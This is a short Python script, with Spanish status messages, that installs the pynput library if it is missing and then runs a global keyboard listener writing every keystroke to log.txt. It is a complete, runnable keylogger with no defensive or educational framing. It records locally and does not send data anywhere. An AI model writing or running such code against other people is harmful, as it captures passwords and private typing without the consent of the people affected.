import subprocess
import sys

try:
    import pynput
except ImportError:
    print("pynput no está instalado. Instalando...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    import pynput  # lo intentamos nuevamente

print("pynput está listo para usarse.")

with open("log.txt", "w") as log:
    log.write("")

def on_press(key):
    with open("log.txt", "a") as log:
        log.write(f"{key}\n")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()